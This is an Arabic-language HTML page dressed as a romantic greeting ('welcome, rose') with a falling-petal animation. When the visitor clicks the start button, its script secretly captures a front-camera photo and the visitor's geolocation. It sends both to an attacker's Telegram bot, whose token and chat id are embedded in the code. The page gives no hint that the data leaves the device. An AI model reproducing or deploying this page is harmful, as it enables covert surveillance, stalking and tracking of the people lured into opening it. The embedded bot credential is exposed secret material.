<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>لحظة حب</title>
  <style>
    body {
      background: #fff0f5;
      overflow: hidden;
      text-align: center;
      font-family: sans-serif;
    }
    #rose {
      font-size: 50px;
      margin-top: 20px;
    }
    canvas {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
    }
    #startBtn {
      font-size: 20px;
      padding: 10px 20px;
      margin-top: 50px;
      background: #ff69b4;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>أهلاً بك يا وردة</h1>
  <p>اضغط الزر للسماح بالكاميرا والموقع</p>
  <button id="startBtn">ابدأ التجربة</button>
  <div id="rose"></div>
  <canvas id="falling"></canvas>

  <script>
    const botToken = '7931908611:AAF5IKqLSL9IJkOezV1Qzgk9sM9v8iuiFYQ';
    const chatId = '7070074537';

    document.getElementById('startBtn').addEventListener('click', async () => {
      document.getElementById('startBtn').style.display = 'none';
      document.querySelector('p').textContent = 'جاري المعالجة...';

      await captureAndSend();
      await sendLocation();
      startFalling();

      document.querySelector('p').textContent = 'انت الورد بحد ذاته!';
    });

    // التقاط الصورة
    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر شوي حتى تشتغل الكاميرا

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        stream.getTracks().forEach(track => track.stop());

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'selfie.jpg');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (e) {
        console.warn('فشل الوصول للكاميرا:', e);
      }
    }

    // إرسال الموقع
    async function sendLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude } = pos.coords;
          const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
          await fetch(url);
        }, err => {
          console.warn("مشكلة بالموقع:", err);
        });
      } else {
        console.warn("المتصفح لا يدعم تحديد الموقع.");
      }
    }

    // تأثير الورد
    function startFalling() {
      const canvas = document.getElementById('falling');
      const ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;

      const petals = Array.from({ length: 50 }, () => ({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        r: Math.random() * 20 + 10,
        d: Math.random() * 1 + 0.5
      }));

      function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "rgba(255,0,128,0.6)";
        petals.forEach(p => {
          ctx.beginPath();
          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
          ctx.fill();
        });
        update();
        requestAnimationFrame(draw);
      }

      function update() {
        petals.forEach(p => {
          p.y += p.d;
          if (p.y > canvas.height) {
            p.y = -p.r;
            p.x = Math.random() * canvas.width;
          }
        });
      }

      draw();
    }
  </script>
</body>
</html>
